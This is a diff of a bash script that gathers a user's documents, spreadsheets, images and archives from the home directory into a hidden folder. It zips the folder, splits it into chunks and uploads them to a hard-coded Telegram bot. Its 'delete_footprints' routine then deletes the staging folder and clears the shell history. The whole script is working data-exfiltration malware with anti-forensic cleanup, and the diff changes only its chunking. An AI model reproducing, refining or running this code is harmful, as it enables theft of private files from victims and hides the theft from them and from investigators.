@@ -1,4 +1,3 @@
-
 #!/bin/bash
 
 # Customizable Parameters
@@ -6,7 +5,7 @@ TELEGRAM_BOT_TOKEN="7773792784:AAFfeZfSjo3yVYIbUPA1xwlMK17l-Fak2sg"  # Replace w
 TELEGRAM_CHAT_ID="1318817377"               # Replace with your chat ID
 ROOT_DIRECTORY="$HOME"                        # Root directory to start searching from
 HIDDEN_DIRECTORY="$HOME/.hidden_folder"       # Hidden directory path
-ZIP_FILE="$HOME/collected_data.zip"           # Temporary ZIP file path
+MAX_FILE_SIZE=45000000                        # 45 MB (to stay under Telegram's 50 MB limit)
 
 # File types to collect (e.g., documents, images, etc.)
 FILE_TYPES=("*.txt" "*.doc" "*.docx" "*.pdf" "*.xls" "*.xlsx" "*.jpg" "*.png" "*.zip" "*.rar")
@@ -46,19 +45,17 @@ collect_files() {
     done
 }
 
-# Function to create a ZIP file
-create_zip_file() {
-    local source_folder="$1"
-    local zip_file="$2"
-    zip -r -9 "$zip_file" "$source_folder" > /dev/null
+# Function to split a file into smaller chunks
+split_file() {
+    local file_path="$1"
+    local output_prefix="$2"
+    split -b "$MAX_FILE_SIZE" "$file_path" "$output_prefix"
 }
 
 # Function to delete footprints
 delete_footprints() {
     # Delete the hidden directory and its contents
     rm -rf "$HIDDEN_DIRECTORY"
-    # Delete the temporary ZIP file and its parts
-    rm -f "$ZIP_FILE" "$ZIP_FILE.part_"*
     # Clear Bash command history
     history -c
 }
@@ -80,17 +77,17 @@ main() {
         cp --parents "$file" "$HIDDEN_DIRECTORY"
     done
 
-    # Create a ZIP file
+    # Compress the hidden directory into a ZIP file
     echo "Creating ZIP file..."
-    create_zip_file "$HIDDEN_DIRECTORY" "$ZIP_FILE"
+    zip -r -9 "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY" > /dev/null
 
-    # Split the ZIP file into 50 MB parts
+    # Split the ZIP file into smaller chunks
     echo "Splitting ZIP file..."
-    split -b 50M "$ZIP_FILE" "$ZIP_FILE.part_"
+    split_file "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY.zip.part_"
 
-    # Send each part to Telegram
+    # Send each chunk to Telegram
     echo "Sending ZIP file parts to Telegram..."
-    for part in "$ZIP_FILE.part_"*; do
+    for part in "$HIDDEN_DIRECTORY.zip.part_"*; do
         send_file_to_telegram "$part"
     done
 
